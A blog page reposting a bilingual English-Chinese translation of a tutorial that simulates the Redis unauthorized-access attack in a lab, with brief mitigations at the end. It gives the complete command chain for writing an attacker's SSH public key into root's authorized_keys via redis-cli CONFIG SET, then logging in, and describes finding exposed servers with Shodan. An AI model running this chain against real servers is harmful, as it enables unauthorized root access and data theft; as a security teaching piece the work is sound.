<!DOCTYPE html>



  


<html class="theme-next gemini use-motion" lang="zh-Hans">
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="redis,安全,">










<meta name="description" content="Redis, is an open source, widely popular data structure tool that can be used as an in-memory distributed database, message broker or cache. Since it is designed to be accessed inside trusted environm">
<meta name="keywords" content="redis,安全">
<meta property="og:type" content="article">
<meta property="og:title" content="redis unauthorized access vulnerability simulation(redis未经授权的访问漏洞模拟)">
<meta property="og:url" content="http://yoursite.com/翻译/redis-unauthorized-access-vulnerability-simulation/index.html">
<meta property="og:site_name" content="简杰的 Blog">
<meta property="og:description" content="Redis, is an open source, widely popular data structure tool that can be used as an in-memory distributed database, message broker or cache. Since it is designed to be accessed inside trusted environm">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="http://yoursite.com/img/review/0_UqCMKzd401p_9xgf.png">
<meta property="og:image" content="http://yoursite.com/img/review/0_kj5v1UOnDs4_1B-4.png">
<meta property="og:image" content="http://yoursite.com/img/review/0_RXLExaGb28VkI0xO.png">
<meta property="og:image" content="http://yoursite.com/img/review/0_ly-kkskrTIJ72LFM.png">
<meta property="og:image" content="http://yoursite.com/img/review/0_xTWYFYecso8XJKdI.png">
<meta property="og:image" content="http://yoursite.com/img/review/0_wjEeD2SSdTnymBVT.png">
<meta property="og:image" content="http://yoursite.com/img/review/0_ueth-xQWtxJobzwL.png">
<meta property="og:image" content="http://yoursite.com/img/review/0_C2n27eAOGFkK79IU.png">
<meta property="og:image" content="http://yoursite.com/翻译/redis-unauthorized-access-vulnerability-simulation/img/0_m19lcFYeFOhB_Nui.png">
<meta property="og:image" content="http://yoursite.com/翻译/redis-unauthorized-access-vulnerability-simulation/img/0_hxf9oaOFJVDohZMC.png">
<meta property="og:image" content="http://yoursite.com/翻译/redis-unauthorized-access-vulnerability-simulation/img/0_C4_dcCGWAPWxFbaU.png">
<meta property="og:updated_time" content="2019-08-23T15:15:33.984Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="redis unauthorized access vulnerability simulation(redis未经授权的访问漏洞模拟)">
<meta name="twitter:description" content="Redis, is an open source, widely popular data structure tool that can be used as an in-memory distributed database, message broker or cache. Since it is designed to be accessed inside trusted environm">
<meta name="twitter:image" content="http://yoursite.com/img/review/0_UqCMKzd401p_9xgf.png">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Gemini',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/翻译/redis-unauthorized-access-vulnerability-simulation/">





  <title>redis unauthorized access vulnerability simulation(redis未经授权的访问漏洞模拟) | 简杰的 Blog</title>
  





  <script type="text/javascript">
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "https://hm.baidu.com/hm.js?3094125d6c6fead2ab23a1ef8b067249";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script>




</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">简杰的 Blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">一起学习，一起进步</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            归档
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
            
            关于
          </a>
        </li>
      

      
        <li class="menu-item menu-item-search">
          
            <a href="javascript:;" class="popup-trigger">
          
            
              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
            
            搜索
          </a>
        </li>
      
    </ul>
  

  
    <div class="site-search">
      
  <div class="popup search-popup local-search-popup">
  <div class="local-search-header clearfix">
    <span class="search-icon">
      <i class="fa fa-search"></i>
    </span>
    <span class="popup-btn-close">
      <i class="fa fa-times-circle"></i>
    </span>
    <div class="local-search-input-wrapper">
      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
    </div>
  </div>
  <div id="local-search-result"></div>
</div>



    </div>
  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/翻译/redis-unauthorized-access-vulnerability-simulation/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="jani">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/img/12641322.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="简杰的 Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">redis unauthorized access vulnerability simulation(redis未经授权的访问漏洞模拟)</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-04-06T20:43:02+08:00">
                2019-04-06
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/翻译/" itemprop="url" rel="index">
                    <span itemprop="name">翻译</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <p>Redis, is an open source, widely popular data structure tool that can be used as an in-memory distributed database, message broker or cache. Since it is designed to be accessed inside trusted environments, it should not be exposed on the Internet. However, some Redis’ are bind to public interface and even has no password authentication protection.</p>
<p>Redis是一个开源的、广泛流行的数据结构工具，可以用作内存中的分布式数据库、消息代理或缓存。因为它被设计为在受信任的环境中访问，所以不应该在 Internet 上公开。然而，一些 Redis 绑定到公共接口，甚至没有密码身份验证保护。</p>
<p>Under certain conditions, if Redis runs with the root account (or not even), attackers can write an SSH public key file to the root account, directly logging on to the victim server through SSH. This may allow hackers to gain server privileges, delete or steal data, or even lead to an encryption extortion, critically endangering normal business services.</p>
<p>在某些条件下，如果Redis使用 root 帐户运行（甚至不使用），攻击者可以向根帐户写入 SSH 公钥文件，直接通过 SSH 登录到受害服务器。这可能使黑客获得服务器特权，删除或窃取数据，甚至导致加密勒索，严重危害正常的业务服务。</p>
<p>The simplified flow of this exploit is:</p>
<ul>
<li>Login to a unprotected Redis</li>
<li>Change it’s backup location to .ssh directory — Write the SSH Keys to new backup location</li>
<li>Remote connect and login to the target server using SSH key</li>
</ul>
<p>We should already be familiar how automatic SSH login with private + public keys works.</p>
<p>简化实现流程如下：</p>
<ul>
<li>登录到一个无保护的 Redis</li>
<li>将备份位置更改为 .ssh 目录 —— 将SSH密钥写入新的备份位置</li>
<li>使用 SSH 密钥远程连接并登录到目标服务器</li>
</ul>
<p>我们应该已经熟悉了如何使用私有+公钥自动登录 SSH。</p>
<h2 id="Simulation"><a href="#Simulation" class="headerlink" title="Simulation"></a>Simulation</h2><h2 id="模拟"><a href="#模拟" class="headerlink" title="模拟"></a>模拟</h2><p>Now let’s get our feet wet and set up a target machine. We’ll need two machines, they can be real machines, virtual machines, or remote machines (VPS). As long as the attack end is able to ping the target end, we are good.</p>
<p>现在让我们先把做好模拟前准备。我们需要两台机器，它们可以是真正的机器、虚拟机或远程机器(VPS)。只要攻击端能够 ping 目标端就可以了。</p>
<p>Environment setup for this example:</p>
<ul>
<li>Target Machine: Redis-3.2.11 on Ubuntu</li>
<li>Attack Machine: Platform you like with Redis (I used Kali)</li>
</ul>
<p>示例中的环境如下：</p>
<ul>
<li>目标机器：ubuntu 下有 Redis-3.2.11</li>
<li>攻击机器：你喜欢的平台与 Redis(我用的是 Kali)</li>
</ul>
<h3 id="Set-Up-Target-Machine"><a href="#Set-Up-Target-Machine" class="headerlink" title="Set Up Target Machine:"></a>Set Up Target Machine:</h3><h3 id="设定目标机器："><a href="#设定目标机器：" class="headerlink" title="设定目标机器："></a>设定目标机器：</h3><p>First, let us set up the target machine with Redis. Download source code by</p>
<p>首先，让我们配置目标机器的 Reids。下载源代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://download.redis.io/releases/redis-3.2.11.tar.gz</span><br></pre></td></tr></table></figure>
<p>Extract and build</p>
<p>提取和构建</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tar xzf redis-3.2.11.tar.gz cd redis-3.2.11</span><br><span class="line">make</span><br></pre></td></tr></table></figure>
<p>After make, we use our favorite editor to open <code>redis.conf</code> in <code>redis-3.2.11</code> folder. In order to be remotely accessed, we will need to comment out line <code>bind 127.0.0.1</code> and disable <code>protected-mode</code> as shown below.</p>
<p>编译后，我们使用我们最喜欢的编辑器打开 <code>redis-3.2.11</code> 文件夹 的 <code>redis.conf</code>。为了远程访问，我们需要注释掉 <code>bind 127.0.0.1</code> 行，并禁用 <code>protected-mode</code>，如下所示。</p>
<p><img src="/img/review/0_UqCMKzd401p_9xgf.png" alt></p>
<p>Now fire up Redis with the configuration file we just edited. Note that <code>redis-server</code> is in <code>redis-3.2.11/src</code>.</p>
<p>现在用我们刚刚编辑的配置文件启动Redis。注意 <code>redis-server</code> 在 <code>redis-3.2.11/src</code> 中。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">src/redis-server redis.conf</span><br></pre></td></tr></table></figure>
<p>So far, we have finished setting up the target server. Additionally, we should also check if we have <code>.ssh</code> folder. If not, we should create it for the attack later.</p>
<p>到目前为止，我们已经完成了目标服务器的设置。此外，我们还应该检查我们是否有 <code>.ssh</code>的文件夹。如果没有，我们应该为以后的攻击创建它。</p>
<h3 id="Attack-Machine"><a href="#Attack-Machine" class="headerlink" title="Attack Machine:"></a>Attack Machine:</h3><h3 id="攻击机器："><a href="#攻击机器：" class="headerlink" title="攻击机器："></a>攻击机器：</h3><p>First, make sure we can ping the target. Then, we will generate a private key and public key for SSHing into the target machine later. Run the following command to generate SSH keys and leave passphrase empty.</p>
<p>首先，确保我们能锁定目标。然后，我们将生成私钥和公钥，以便稍后将其插入目标机器。运行以下命令生成SSH密钥，并保留密码为空。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure>
<p>Next, enter the <code>.ssh</code> folder. If you are root user, enter <code>/.ssh</code>, otherwise <code>~/.ssh</code>, then copy the private key in to <code>temp.txt</code>.</p>
<p>下一步，进入 <code>.ssh</code> 目录。如果你是 root 用户，进入 <code>/.ssh</code>，其他的进入 <code>~/.ssh</code>。复制私钥到 <code>temp.txt</code>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; temp.txt</span><br></pre></td></tr></table></figure>
<p>Some may be wondering that why do we put two blank lines before and after the public key? We will leave that as a mystery for right now if you don’t know :)</p>
<p>有些人可能想知道，为什么在公钥之前和之后要放两行空白?如果你不知道，我们暂时把它作为一个谜 :)</p>
<p><img src="/img/review/0_kj5v1UOnDs4_1B-4.png" alt></p>
<p>Good! So far we have generated a pair a keys, we will need to find a way to smuggle the public key to the Redis server (target machine.)</p>
<p>好了！到目前为止，我们已经生成了一对密钥，我们将需要找到一种方法将公钥偷运到Redis服务器(目标机器)。</p>
<p>We are going to use <code>redis-cli</code>, the Redis command line interface, to send commands to Redis and read the replies sent by the server directly in the terminal.</p>
<p>我们将使用 <code>redis-cli</code>，即 Redis 命令行接口，向 Redis 发送命令，并直接读取终端服务器发送的响应。</p>
<p>Run the following commands in <code>redis-3.2.11/src</code> folder. (Or depending where we are, we can always specify the path to the files we use)</p>
<p>在 <code>redis-3.2.11/src</code> 文件夹中运行以下命令。(或者根据我们的位置，我们总是可以指定我们使用的文件的路径)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /.ssh/temp.txt | redis-cli -h 203.137.255.255 -x set s-key</span><br></pre></td></tr></table></figure>
<p>Here, let’s take a look at the command. We use <code>-h</code> flag to specify the remote Redis server IP so that <code>redis-cli</code> knows where to connect and send commands. The part after <code>-x</code> is saying that we are setting the key in redis named <code>s-key</code> with the value in <code>temp.txt</code>.</p>
<p>在这里，让我们看一下命令。我们使用 <code>-h</code> 标志来指定远程 Redis 服务器 IP，以便 <code>redis-cli</code> 知道在何处连接和发送命令。<code>-x</code> 后面的部分表示，我们正在设置 redis 中的键名为 <code>s-key</code>，其值位于 <code>temp.txt</code> 中。</p>
<p><img src="/img/review/0_RXLExaGb28VkI0xO.png" alt></p>
<p>Yea, we have a key with our SSH key sneaked in! Let’s connect to the Redis and play around its configuration. Use <code>redis-cli</code> to connect to the Redis server again.</p>
<p>是的，我们有一个密钥，SSH 密钥偷偷溜进来了!让我们连接到Redis并研究它的配置。再次使用 <code>redis-cli</code> 连接到 Redis 服务器。</p>
<p><img src="/img/review/0_ly-kkskrTIJ72LFM.png" alt></p>
<p>Looking at the above screenshot, we first verify the value of the key <code>s-key</code> by using the command <code>GET s-key</code>, which is what we want – the public key with two blank lines before and after. Then I tried the command “dir” just to see what it says (kidding). What we actually want to do here is to get the value of “s-key” (SSH public key) stored in the <code>.ssh</code> folder so that we can remote SSH login to the target machine whithout having to type the password.</p>
<p>查看上面的屏幕截图，我们首先使用命令 <code>GET s-key</code> 来验证键 <code>s-key</code> 的值，这正是我们想要的——前后各有两行空白的公钥。然后，我尝试命令 “dir”，只是为了看看它说了什么(开玩笑)。这里我们真正想做的是获取存储在 <code>.ssh</code> 文件夹中的“s-key”(SSH公钥)的值，这样我们就可以远程ssh登录到目标机器，而不需要输入密码。</p>
<p>Thus, we will do this:</p>
<p>因此，我们将这样做:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CONFIG GET dir # get your redis directory</span><br><span class="line"># In the output of above command &quot;/home/xxxx/redis-3.2.11/src&quot; is the directory where redis server is installed. CONFIG SET dir</span><br><span class="line">/home/xxxx/.ssh # set the backup location to the .ssh folder</span><br><span class="line">(or) CONFIG SET dir /root/.ssh CONFIG SET dbfilename authorized_keys</span><br><span class="line"># lastly we back our data containing our &quot;s-key&quot; key-value pair up in the .ssh folder</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
<blockquote>
<p>The authorized_keys file in SSH specifies the SSH keys that can be used for logging into the user account for which the file is configured Source: <a href="https://www.ssh.com/ssh/authorized_keys/" target="_blank" rel="noopener">ssh.com</a><br>The screenshot shown above already demonstrates the steps mentioned here.</p>
</blockquote>
<blockquote>
<p>SSH中的 authorized_keys 文件指定了 SSH 密钥，可用于登录到文件配置源的用户帐户: <a href="https://www.ssh.com/ssh/authorized_keys/" target="_blank" rel="noopener">ssh.com</a><br>上面的截图已经演示了这里提到的步骤。</p>
</blockquote>
<h3 id="Harvest-Time"><a href="#Harvest-Time" class="headerlink" title="Harvest Time"></a>Harvest Time</h3><h3 id="结果时间"><a href="#结果时间" class="headerlink" title="结果时间"></a>结果时间</h3><p>On Attack Machine, try to SSH in the Target Machine using the following command.</p>
<p>在攻击机器上，尝试使用下面的命令在目标机器上SSH。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># command: private key username@server IP</span><br><span class="line">ssh -i id_rsa username@203.137.255.255</span><br></pre></td></tr></table></figure>
<p><img src="/img/review/0_xTWYFYecso8XJKdI.png" alt></p>
<p>YAS! As we can see, we have a successful auto-login with SSH keys! Voila, we have now completed the attack simulation. 😃</p>
<p>好，可以看到，我们成功地使用 SSH 密钥自动登录!瞧，我们现在已经完成了攻击模拟。😃</p>
<p>(Smiley face actually means that I’m finally almost done writing this up 😂)</p>
<p>(笑脸实际上意味着我差不多写完了😂)</p>
<p>At the end of this section, I would like to show what is Redis’s backup file look like.</p>
<p>在本节的最后，我想展示一下什么是 Redis 的备份文件。</p>
<p><img src="/img/review/0_wjEeD2SSdTnymBVT.png" alt></p>
<p>Notice the unreadable characters? Add “\n\n” before and after the key content was just to be safe and separate it from other “stuff” so that it can be parsed correctly. 👌</p>
<p>注意到这些不可读的字符了吗?在关键内容之前和之后添加“\n\n”只是为了安全起见，并将其与其他“内容”分开，以便正确解析。</p>
<h2 id="Use-Search-Engine-to-find-Vulnerable-Redis-Servers"><a href="#Use-Search-Engine-to-find-Vulnerable-Redis-Servers" class="headerlink" title="Use Search Engine to find Vulnerable Redis Servers"></a>Use Search Engine to find Vulnerable Redis Servers</h2><h2 id="使用搜索引擎查找易受攻击的Redis服务器"><a href="#使用搜索引擎查找易受攻击的Redis服务器" class="headerlink" title="使用搜索引擎查找易受攻击的Redis服务器"></a>使用搜索引擎查找易受攻击的Redis服务器</h2><p>Alrighty, as I mentioned, we are going to use <a href="https://www.shodan.io/" target="_blank" rel="noopener">Shodan</a> to search servers that has Redis footprint (characteristics).</p>
<p>好的，正如我提到的，我们将使用 <a href="https://www.shodan.io/" target="_blank" rel="noopener">Shodan</a> 来搜索具有 Redis footprint(特征)的服务器。</p>
<p>Let us do a simple search by Redis’ default port.</p>
<p>让我们做一个简单的搜索，通过Redis的默认端口。</p>
<p><img src="/img/review/0_ueth-xQWtxJobzwL.png" alt></p>
<p>Looks like we have 75,665 search results. Aaaaaand guess what! Right down there (not shown but we can see it if we scroll down) there are TONS of host that has NO password protection!!</p>
<p>看起来我们有 75,665 个搜索结果。猜猜看!就在那里(没有显示，但我们可以看到，如果我们向下滚动)有些主机没有密码保护!!</p>
<p>This vulnerability was found years ago and still countless of machines are opening up themselves in such an easy way for attackers to have fun in there server…</p>
<p>这个漏洞是几年前发现的，仍然有无数的机器以这种简单的方式打开自己，让攻击者在那里的服务器中得到乐趣…</p>
<p>According to Shodan, there are around <strong>56,000 unprotected</strong> Redis instances in 2015.</p>
<p>根据 Shodan 的数据，2015 年大约有 5,6000 个不受保护的Redis实例。</p>
<p><img src="/img/review/0_C2n27eAOGFkK79IU.png" alt></p>
<p>According to ZoomEye, the distribution of the instances is.</p>
<p>根据 ZoomEye，实例的分布是。</p>
<p><img src="img/0_m19lcFYeFOhB_Nui.png" alt></p>
<p>According to ZoomEye, the top ranking countries of these instances are: China, USA, Germany…</p>
<p>ZoomEye表示，这些例子中排名最高的国家是:中国、美国、德国……</p>
<p><img src="img/0_hxf9oaOFJVDohZMC.png" alt></p>
<p>Okay, back to the business. So how do we verify if a server is protected using python? It turns out to be fairly simple.</p>
<p>好了，回到正题。那么，我们如何验证是否使用 python 保护服务器呢？结果相当简单。</p>
<ol>
<li>Use socket to connect to the target IP</li>
<li>Perform a GET request</li>
<li><p>If the server is unprotected, you GET request will succeed; otherwise it will fail</p>
</li>
<li><p>使用套接字连接到目标IP</p>
</li>
<li>执行GET请求</li>
<li>如果服务器不受保护，您的GET请求将成功;否则就会失败</li>
</ol>
<p><img src="img/0_C4_dcCGWAPWxFbaU.png" alt></p>
<h2 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h2><h2 id="减轻"><a href="#减轻" class="headerlink" title="减轻"></a>减轻</h2><ul>
<li>Don’t bind to 0.0.0.0</li>
<li>If you have to, change the default port (6379)</li>
<li><p>Set a password (for everything)</p>
</li>
<li><p>不要绑定 0.0.0.0</p>
</li>
<li>如果有必要的话，修改默认端口 (6379)</li>
<li>为所有的 Reids 设置密码</li>
</ul>
<p>Sep 11, 2018 （2018-09-11）</p>
<p>author: Victor Zhu</p>
<p>link: <a href="https://medium.com/@Victor.Z.Zhu/redis-unauthorized-access-vulnerability-simulation-victor-zhu-ac7a71b2e419" target="_blank" rel="noopener">https://medium.com/@Victor.Z.Zhu/redis-unauthorized-access-vulnerability-simulation-victor-zhu-ac7a71b2e419</a></p>

      
    </div>
    
    
    

    

    
      <div>
        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
  <div>坚持原创技术分享，您的支持将鼓励我继续创作！</div>
  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
    <span>打赏</span>
  </button>
  <div id="QR" style="display: none;">

    
      <div id="wechat" style="display: inline-block">
        <img id="wechat_qr" src="/img/wechatpay.jpg" alt="jani 微信支付">
        <p>微信支付</p>
      </div>
    

    
      <div id="alipay" style="display: inline-block">
        <img id="alipay_qr" src="/img/alipay.jpg" alt="jani 支付宝">
        <p>支付宝</p>
      </div>
    

    

  </div>
</div>

      </div>
    

    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/redis/" rel="tag"># redis</a>
          
            <a href="/tags/安全/" rel="tag"># 安全</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/算法/reverse-integer/" rel="next" title="整数反转">
                <i class="fa fa-chevron-left"></i> 整数反转
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/思考/如何减少需求理解的偏差/" rel="prev" title="如何减少需求理解的偏差">
                如何减少需求理解的偏差 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image" src="/img/12641322.jpg" alt="jani">
            
              <p class="site-author-name" itemprop="name">jani</p>
              <p class="site-description motion-element" itemprop="description">一起学习，一起进步</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">27</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">9</span>
                  <span class="site-state-item-name">分类</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">14</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          

          
            <div class="links-of-author motion-element">
                
                  <span class="links-of-author-item">
                    <a href="https://github.com/test-lin" target="_blank" title="GitHub">
                      
                        <i class="fa fa-fw fa-github"></i>GitHub</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="mailto:liberty_linlin@qq.com" target="_blank" title="E-Mail">
                      
                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
                  </span>
                
            </div>
          

          
          

          
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Simulation"><span class="nav-number">1.</span> <span class="nav-text">Simulation</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#模拟"><span class="nav-number">2.</span> <span class="nav-text">模拟</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Set-Up-Target-Machine"><span class="nav-number">2.1.</span> <span class="nav-text">Set Up Target Machine:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#设定目标机器："><span class="nav-number">2.2.</span> <span class="nav-text">设定目标机器：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Attack-Machine"><span class="nav-number">2.3.</span> <span class="nav-text">Attack Machine:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#攻击机器："><span class="nav-number">2.4.</span> <span class="nav-text">攻击机器：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Harvest-Time"><span class="nav-number">2.5.</span> <span class="nav-text">Harvest Time</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#结果时间"><span class="nav-number">2.6.</span> <span class="nav-text">结果时间</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Use-Search-Engine-to-find-Vulnerable-Redis-Servers"><span class="nav-number">3.</span> <span class="nav-text">Use Search Engine to find Vulnerable Redis Servers</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#使用搜索引擎查找易受攻击的Redis服务器"><span class="nav-number">4.</span> <span class="nav-text">使用搜索引擎查找易受攻击的Redis服务器</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Mitigation"><span class="nav-number">5.</span> <span class="nav-text">Mitigation</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#减轻"><span class="nav-number">6.</span> <span class="nav-text">减轻</span></a></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; 2016 &mdash; <span itemprop="copyrightYear">2019</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">jani</span>

  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  


  











  
  
